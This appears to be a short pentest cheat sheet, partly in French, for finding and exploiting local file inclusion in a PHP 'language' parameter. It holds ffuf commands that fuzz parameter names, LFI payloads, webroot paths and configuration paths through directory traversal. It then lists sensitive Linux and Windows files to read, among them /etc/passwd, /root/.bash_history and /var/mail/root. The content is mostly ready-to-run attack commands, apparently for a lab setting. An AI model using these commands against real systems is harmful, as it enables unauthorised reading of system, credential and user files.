
Fuzz page parameters

```sh
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

Fuzz LFI payloads

```sh
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287 
```

Fuzz webroot path

```sh
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287 
```

Fuzz server configurations

```sh
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287 
```

---

Fichiers de système d'exploitation courants a utiliser.

**Linux**

```sh
/etc/issue
/etc/passwd
/etc/os-release
/proc/version
/etc/profile
/root/.bash_history
/var/log/dmessage
/var/mail/root
```

**Windows**

```sh
c:\boot.ini
../../../../boot.ini
../../../../windows/win.ini
```


